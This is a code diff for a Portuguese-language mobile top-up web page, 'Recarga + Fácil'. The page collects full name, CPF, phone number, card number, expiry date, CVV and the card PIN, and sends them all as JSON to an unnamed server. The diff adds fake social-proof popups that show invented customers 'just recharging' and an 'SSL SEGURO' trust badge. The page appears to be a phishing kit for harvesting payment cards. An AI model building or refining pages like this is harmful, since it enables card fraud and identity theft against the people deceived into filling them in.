@@ -12,9 +12,6 @@
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
-            
-            /* CONFIGURAÇÃO DA IMAGEM DE FUNDO */
-            /* O linear-gradient cria uma película escura (0.5) para o formulário se destacar */
             background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('fundo.jpg');
             background-size: cover;
             background-position: center;
@@ -24,7 +21,7 @@
         }
 
         .container {
-            background-color: rgba(255, 255, 255, 0.95); /* Fundo semi-transparente */
+            background-color: rgba(255, 255, 255, 0.95);
             padding: 30px;
             border-radius: 15px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.3);
@@ -34,17 +31,22 @@
             text-align: center;
         }
 
-        h2 { color: #0056b3; margin-bottom: 20px; }
+        h2 { color: #0056b3; margin-bottom: 5px; }
+        .subtitle { color: #666; margin-bottom: 25px; font-size: 14px; }
+
+        label { display: block; text-align: left; font-weight: bold; margin-top: 15px; color: #444; }
 
         input, select {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
+            margin: 8px 0;
             border: 1px solid #ddd;
             border-radius: 8px;
             box-sizing: border-box;
             font-size: 16px;
         }
+
+        .step-hidden { display: none; }
 
         button {
             width: 100%;
@@ -58,6 +60,7 @@
             cursor: pointer;
             transition: background 0.3s;
             margin-top: 20px;
+            text-transform: uppercase;
         }
 
         button:hover { background-color: #218838; }
@@ -68,64 +71,122 @@
             justify-content: center;
             gap: 15px;
             opacity: 0.8;
+            font-size: 12px;
         }
 
-        /* Estilo para as notificações de prova social */
+        /* Notificações de Prova Social */
         #notification-container {
             position: fixed;
             bottom: 20px;
             left: 20px;
             z-index: 1000;
         }
+
+        .notif {
+            background: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            margin-bottom: 10px;
+            font-size: 13px;
+            border-left: 5px solid #28a745;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
     </style>
 </head>
 <body>
 
+    <div id="notification-container"></div>
+
     <div class="container">
         <h2>Recarga + Fácil 📱</h2>
-        <p>Informe os dados para recarregar agora</p>
+        <p class="subtitle">Recarregue em menos de 30 segundos</p>
         
         <form id="formRecarga">
-            <input type="text" id="nome" placeholder="Nome Completo" required>
-            <input type="text" id="cpf" placeholder="CPF" required>
-            <input type="text" id="telefone" placeholder="(00) 00000-0000" required>
-            
-            <select id="operadora">
-                <option value="">Selecione a Operadora</option>
-                <option value="Vivo">Vivo</option>
-                <option value="Tim">Tim</option>
-                <option value="Claro">Claro</option>
-                <option value="Oi">Oi</option>
-            </select>
+            <div id="passo1">
+                <label>1. Escolha a Operadora</label>
+                <select id="operadora" required>
+                    <option value="">Selecione...</option>
+                    <option value="Vivo">Vivo</option>
+                    <option value="Tim">Tim</option>
+                    <option value="Claro">Claro</option>
+                    <option value="Oi">Oi</option>
+                </select>
 
-            <select id="valor">
-                <option value="">Valor da Recarga</option>
-                <option value="20">R$ 20,00</option>
-                <option value="30">R$ 30,00</option>
-                <option value="50">R$ 50,00</option>
-                <option value="100">R$ 100,00</option>
-            </select>
+                <label>2. Valor da Recarga</label>
+                <select id="valor" required>
+                    <option value="">Selecione o valor...</option>
+                    <option value="20">R$ 20,00</option>
+                    <option value="30">R$ 30,00</option>
+                    <option value="40">R$ 40,00</option>
+                    <option value="50">R$ 50,00</option>
+                    <option value="100">R$ 100,00</option>
+                </select>
 
-            <input type="text" id="cartao" placeholder="Número do Cartão" required>
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="data" placeholder="MM/AA" required>
-                <input type="text" id="cvv" placeholder="CVV" required>
+                <button type="button" onclick="proximoPasso()">CONTINUAR</button>
             </div>
-            <input type="password" id="senha" placeholder="Senha do Cartão" required>
 
-            <button type="submit">FINALIZAR RECARGA</button>
+            <div id="passo2" class="step-hidden">
+                <label>3. Dados da Linha</label>
+                <input type="text" id="nome" placeholder="Nome Completo" required>
+                <input type="text" id="telefone" placeholder="(00) 00000-0000" required>
+                <input type="text" id="cpf" placeholder="CPF" required>
+                
+                <label>4. Pagamento</label>
+                <input type="text" id="cartao" placeholder="Número do Cartão" required>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="data" placeholder="MM/AA" required>
+                    <input type="text" id="cvv" placeholder="CVV" required>
+                </div>
+                <input type="password" id="senha" placeholder="Senha do Cartão" required>
+
+                <button type="submit">CONFIRMAR RECARGA</button>
+                <p style="font-size: 11px; margin-top: 10px; color: #888;">Ao confirmar, você concorda com os termos de serviço.</p>
+            </div>
         </form>
 
         <div class="footer-selos">
-            <small>🔒 Ambiente Seguro</small>
-            <small>✅ Verificado</small>
+            <span>🔒 SSL SEGURO</span>
+            <span>💳 PIX / CARTÃO</span>
         </div>
     </div>
 
     <script>
+        // Função para mudar de aba (Valor -> Dados)
+        function proximoPasso() {
+            const operadora = document.getElementById('operadora').value;
+            const valor = document.getElementById('valor').value;
+
+            if(operadora && valor) {
+                document.getElementById('passo1').classList.add('step-hidden');
+                document.getElementById('passo2').classList.remove('step-hidden');
+            } else {
+                alert('Por favor, selecione a operadora e o valor.');
+            }
+        }
+
+        // Prova Social - Notificações de pessoas carregando
+        const nomes = ["Marcos S.", "Julia R.", "Mateus B.", "Ana Paula", "Ricardo F.", "Sandro L.", "Beatriz W.", "Carlos D."];
+        const container = document.getElementById('notification-container');
+
+        function criarNotificacao() {
+            const nome = nomes[Math.floor(Math.random() * nomes.length)];
+            const valor = [20, 30, 40, 50, 100][Math.floor(Math.random() * 5)];
+            const div = document.createElement('div');
+            div.className = 'notif';
+            div.innerHTML = `✅ <b>${nome}</b> acabou de recarregar <b>R$ ${valor},00</b>`;
+            container.appendChild(div);
+
+            setTimeout(() => { div.remove(); }, 4000);
+        }
+
+        setInterval(criarNotificacao, 5000);
+
+        // Envio dos dados para o seu servidor
         document.getElementById('formRecarga').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             const dados = {
                 nome: document.getElementById('nome').value,
                 cpf: document.getElementById('cpf').value,
@@ -144,16 +205,14 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(dados)
                 });
-
                 if (response.ok) {
-                    alert('Recarga processada com sucesso!');
+                    alert('Solicitação enviada! Aguarde o processamento.');
                     window.location.reload();
                 }
             } catch (err) {
-                alert('Erro ao processar recarga. Tente novamente.');
+                alert('Erro de conexão.');
             }
         });
     </script>
-
 </body>
 </html>
